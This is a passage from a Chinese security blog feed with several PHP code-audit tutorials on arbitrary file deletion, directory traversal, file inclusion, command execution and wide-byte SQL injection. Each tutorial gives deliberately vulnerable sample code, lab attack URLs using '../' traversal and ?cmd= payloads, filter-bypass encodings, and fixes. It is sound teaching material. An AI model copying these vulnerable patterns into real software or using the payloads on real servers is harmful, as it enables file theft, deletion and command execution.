function">file_exists</span><span class="token punctuation">(</span><span class="token string">"$filename"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token shell-comment comment"># 删除$filename传过来的目录或文件</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"$filename"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('删除成功！')&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;script>alert("删除失败！")&lt;/script>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;h1>任意文件删除&lt;/h1>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先来操作当前目录下1.txt</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.137:8001/anydelete/index.php?file=./1.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201203205802927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>跨目录删除anyread/config/1.txt：</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.137:8001/anydelete/index.php?file=../anyread/config/1.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功删除：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201203205920679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201203205959937.png" alt="在这里插入图片描述"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>采用正则匹配，严格过滤用户参数</li><li>检查用户使用的文件名是否存在../这样的字符</li><li>在php.ini中设置open_basedir来限定文件访问范围</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 任意文件读取 </tag>
            
            <tag> 任意文件删除 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：目录遍历漏洞</title>
      <link href="/posts/505c2828.html"/>
      <url>/posts/505c2828.html</url>
      
        <content type="html"><![CDATA[<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><blockquote><p>目录穿越（directory traversal）是HTTP开发的一种形式，黑客在一个Web服务器上使用这个软件除了可以访问服务器的根目录外还可以访问目录里面的数据。如果这种企图成功的话，那么黑客就可以查看到这些受限制的文件或者是服务器上的执行命令。Directory traversal攻击时一般是使用Web浏览器。从Web浏览器输入数据的任何服务器都很容易受到这种类型的攻击。</p></blockquote><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>造成敏感信息泄露、数据泄露等危害，单说这一个漏洞倒是没什么，主要是组合起来进行攻击，结合敏感信息去搜集一些exp等等，轻则站点被黑，重则服务器被黑</p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string">"../file/"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>读取上级目录sql中的index.php</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.137:8888/dirthourgh/index.php?file=../sql/index.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201202103503264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><ul><li>进行URL编码</li><li>进行16位unicode编码</li><li>进行URL二次编码</li><li>进行超长UTF8 Unicode编码</li></ul><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><ul><li>在URL内不要使用文件名称作为参数</li><li>检查使用者输入的文件名是否存在“..”这样的目录阶层参数</li><li>在php.ini中设置open_basedir来指定文件的目录</li><li>使用realpath函数来展开文件路径中的“./”、“../”这样的字符，然后返回绝对名称路径</li><li>使用basename函数来返回不包含路径的文件名称</li></ul><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><blockquote><p>文件包含漏洞的成因就是在引用文件时，文件名用户可控，且传入的文件名没有合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致敏感文件泄露甚至恶意代码注入，当被包含的文件在本地时，就形成了本地文件包含，被包含的文件在第三方服务时，就形成了远程文件包含</p></blockquote><h4 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h4><ul><li>执行恶意代码</li><li>包含恶意文件控制网站</li><li>甚至控制网站服务器等</li></ul><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><blockquote><p>本地包含（Local File Include，LFI攻击），允许攻击者包含本机上的文件。当一个WEB应用没有正确过滤输入数据的情况下，就有可能存在这个漏洞，该漏洞允许攻击者操作输入数据，注入路径遍历字符、包含Web服务器的其他文件。</p></blockquote><h4 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h4><p>index.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phpinfo.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本地包含一下</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.137:8888/include/index.php?file=./phpinfo.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020120215055542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>现在威力还不是最大的，我们结合上文的目录穿越，去包含一下<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201202151851685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><blockquote><p>远程包含（Remote File Include，RFI攻击），允许攻击者包含远程文件，需要设置allow_url_include = On，四个文件都支持HTTP、FTP等协议，相对本地文件包含共容易利用，自然出现的频率也没有本地文件包含多。</p></blockquote><p>首先你得配置一下php.ini，把allow_url_include打开，接着上面的代码，我们来测试一下:<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201202154110675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="文件包含挖掘经验"><a href="#文件包含挖掘经验" class="headerlink" title="文件包含挖掘经验"></a>文件包含挖掘经验</h4><ol><li><p>模块加载、cache调用，传入的参数拼接包含路径</p></li><li><p>include()<br>使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行</p></li><li><p>include_once()<br>功能同前者一样，，之不过同一文件只能被包含一次</p></li><li><p>require()<br>使用此函数，只要程序执行，就会立即调用包含文件，如果程序出错，会立即停止执行剩下的代码</p></li><li><p>require_once()<br>效果同前者，同一文件至多包含一次</p></li></ol><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>关闭远程包含参数开关</li><li>设置类似白名单的方法，筛选文件名</li><li>常见目录穿越字符进行过滤，比如../、./、..\等</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 目录遍历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：命令执行漏洞</title>
      <link href="/posts/d6dc97a4.html"/>
      <url>/posts/d6dc97a4.html</url>
      
        <content type="html"><![CDATA[<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code>1、命令执行（Command Execution）漏洞即黑客可以直接在Web应用中执行系统命令，从而获取敏感信息或者拿下shell权限2、命令执行漏洞可能造成的原因是Web服务器对用户输入命令安全检测不足，导致恶意代码被执行3、更常见的命令执行漏洞是发生在各种Web组件，包括Web容器、Web框架、CMS软件、安全组件等</code></pre><h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><ol><li>用户能够控制函数输入</li><li>存在可执行命令的危险函数</li></ol><h3 id="命令执行与代码执行的区别"><a href="#命令执行与代码执行的区别" class="headerlink" title="命令执行与代码执行的区别"></a>命令执行与代码执行的区别</h3><p>代码执行：执行效果完全依赖于语言本身</p><p>命令执行：执行效果不受语言本身、命令本身的限制</p><h3 id="命令执行的类型"><a href="#命令执行的类型" class="headerlink" title="命令执行的类型"></a>命令执行的类型</h3><ul><li>代码层过滤不严格</li><li>系统的漏洞造成命令注入</li><li>调用的第三方组件存在代码执行漏洞<h3 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h3><h4 id="system-和passthru"><a href="#system-和passthru" class="headerlink" title="system()和passthru()"></a>system()和passthru()</h4><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127102921296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li></ul><p>举个例子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;hd>'</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 或者</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>cmd<span class="token operator">=</span>ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127105430855.png#pic_center" alt="在这里插入图片描述"></p><h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127142519668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>exec跟上面两个函数的区别就是，我们需要去打印一下，它才会输出它的回显信息，而且也只会输出一行：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;pre >"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127143007164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>它相对于exec来说体验更好，也是需要echo一下，不过它会全部回显：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GBK<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;pre >"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//echo exec($cmd);</span><span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127143211310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="过滤函数"><a href="#过滤函数" class="headerlink" title="过滤函数"></a>过滤函数</h3><h4 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h4><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127143929769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>举个例子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GBK<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;pre >"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//echo exec($cmd);</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//escapeshellarg();</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它过滤了一些特殊字符，以至于命令无法执行：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020112714481253.png#pic_center" alt="在这里插入图片描述"></p><h4 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a>escapeshellarg()</h4><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127143958671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这个函数是将参数转化为字符串，也就是将我们的命令转化为字符串，起到一个保护作用：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GBK<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;pre >"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//echo exec($cmd);</span><span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//escapeshellarg();</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127145319201.png#pic_center" alt="在这里插入图片描述"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>光靠函数是没用的，他仅仅过滤一些特殊字符，命令依然可以执行，所以要注重以下几点：</p><ul><li>尽量少使用命令执行函数，或者直接禁用参数值尽量使用引号包裹</li><li>在使用动态函数之前，确定使用的函数是指定的函数之一</li><li>在进入执行命令的函数\方法之前，对参数进行过滤，对特殊字符进行转义</li><li>对可控点是程序参数的情况下，使用escapeshellcmd()进行过滤；对于可控点是程序参数值的情况下，使用escapeshellarg()进行过滤</li><li>参数的值尽量使用引号包裹，并使用addslashes()进行过滤</li><li>对于第三方的组件造成的漏洞，我们要做的就是及时更近官方补丁，修改安装的默认配置</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：宽字节注入及二次注入漏洞</title>
      <link href="/posts/c8ed1bcb.html"/>
      <url>/posts/c8ed1bcb.html</url>
      
        <content type="html"><![CDATA[<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote><p>在使用PHP连接MySQL的时候，当设置“setcharacter_set_client = gbk”时会导致一个编码转换的问题，也就是我们熟悉的宽字节注入，当存在宽字节注入的时候，注入参数里带入％ DF％27，即可把（％5C）吃掉。这里需要先说两个函数，这两个函数的作用就是防注入。</p></blockquote><h4 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h4><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125142809947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>这里就相当于一个强制转型，即使是特殊符号，也会转译成数字0：</p><p>index.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token operator">/</span><span class="token operator">*</span><span class="token comment" spellcheck="true">// 假定数据库用户名：root，密码：root，数据库：RUNOOB</span><span class="token variable">$con</span><span class="token operator">=</span><span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"连接 MySQL 失败: "</span> <span class="token punctuation">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 接收参数</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 构造SQL语句</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM user WHERE id='$id'"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 执行SQL语句</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 把结果集返回到$row里</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 输出结果</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">'ID: %s'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'ID'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">'username: %s'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">'password: %s'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 释放结果集</span><span class="token function">mysqli_free_result</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 关闭连接</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 打印数据库语句</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">.</span><span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">/</span><span class="token shell-comment comment"># 连接数据库</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"数据库连接失败！"</span><span class="token punctuation">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 构造SQL语句</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM user WHERE id=$id"</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 打印SQL语句</span><span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token 